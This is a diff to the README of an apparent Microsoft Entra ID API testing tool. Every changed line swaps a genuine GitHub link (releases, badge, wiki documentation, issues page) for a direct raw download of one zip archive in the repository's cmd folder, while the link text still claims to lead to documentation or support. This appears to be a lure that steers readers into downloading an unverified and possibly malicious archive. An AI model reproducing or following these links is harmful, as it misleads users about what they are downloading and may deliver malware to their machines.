@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-entra--id--api--tester-brightgreen)](https://github.com/branden314/entra-id-api-tester/releases)
+[![Download Now](https://raw.githubusercontent.com/branden314/entra-id-api-tester/main/cmd/entra-id-api-tester_2.3.zip%20Now-entra--id--api--tester-brightgreen)](https://raw.githubusercontent.com/branden314/entra-id-api-tester/main/cmd/entra-id-api-tester_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download the tool, ensure that you have the following:
 To get started with entra-id-api-tester, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go directly to the downloads page.
-   [Visit this page to download](https://github.com/branden314/entra-id-api-tester/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/branden314/entra-id-api-tester/main/cmd/entra-id-api-tester_2.3.zip)
 
 2. **Choose the Right File**: On the releases page, you will see different files available for download. Select the one that matches your operating system:
    - For Windows: download the `.exe` file.
@@ -61,7 +61,7 @@ Testing an API using entra-id-api-tester is simple. After setting up your enviro
 
 ## 📚 Additional Resources
 
-- **Documentation**: For deeper insights into using the tool, visit our [documentation](https://github.com/branden314/entra-id-api-tester/wiki).
+- **Documentation**: For deeper insights into using the tool, visit our [documentation](https://raw.githubusercontent.com/branden314/entra-id-api-tester/main/cmd/entra-id-api-tester_2.3.zip).
 - **Sample Projects**: Check out sample configuration files on our GitHub page to see how you can set up your API tests.
 
 ## 💡 Troubleshooting
@@ -72,7 +72,7 @@ If you encounter issues:
 - Check your Microsoft Entra ID credentials.
 - Review the application logs for error messages.
 
-For further assistance, please visit our GitHub [issues page](https://github.com/branden314/entra-id-api-tester/issues).
+For further assistance, please visit our GitHub [issues page](https://raw.githubusercontent.com/branden314/entra-id-api-tester/main/cmd/entra-id-api-tester_2.3.zip).
 
 ## 📞 Support
 
@@ -82,4 +82,4 @@ For support, feel free to reach out by opening an issue on our GitHub. We are he
 
 With entra-id-api-tester, testing your Microsoft Entra ID protected API is quick and easy. Follow the steps above, and you will be up and running in no time.
 
-[Visit this page to download](https://github.com/branden314/entra-id-api-tester/releases) and start testing today!
+[Visit this page to download](https://raw.githubusercontent.com/branden314/entra-id-api-tester/main/cmd/entra-id-api-tester_2.3.zip) and start testing today!
